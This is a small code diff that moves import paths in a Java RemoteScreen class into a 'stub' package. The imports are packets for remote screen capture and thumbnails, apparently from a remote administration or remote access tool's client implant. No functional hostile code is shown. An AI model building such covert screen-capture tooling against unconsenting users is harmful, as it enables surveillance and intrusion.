@@ -12,10 +12,10 @@ import java.io.DataOutputStream;
 
 import com.redpois0n.common.compress.GZip;
 import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
-import com.redpois0n.packets.outgoing.Packet17RemoteScreen;
-import com.redpois0n.packets.outgoing.Packet18OneRemoteScreen;
-import com.redpois0n.packets.outgoing.Packet33Thumbnail;
+import com.redpois0n.stub.packets.outgoing.AbstractOutgoingPacket;
+import com.redpois0n.stub.packets.outgoing.Packet17RemoteScreen;
+import com.redpois0n.stub.packets.outgoing.Packet18OneRemoteScreen;
+import com.redpois0n.stub.packets.outgoing.Packet33Thumbnail;
 import com.redpois0n.utils.ImageUtils;
 
 public class RemoteScreen {
